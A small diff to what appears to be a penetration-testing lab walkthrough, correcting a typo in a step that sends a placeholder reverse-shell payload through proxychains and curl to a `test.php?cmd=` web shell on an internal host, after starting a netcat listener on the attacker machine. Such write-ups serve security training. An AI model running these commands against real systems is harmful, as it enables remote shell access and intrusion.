@@ -220,7 +220,7 @@ root@attacker:/# nc -lvnp 1331
 
 Next, we send the revershell payload to `victim`
 ```bash
-root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=e<<rev_shell_payload>>
+root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=<<rev_shell_payload>>
 ```
 
 Finally, we are into the `victim` machine
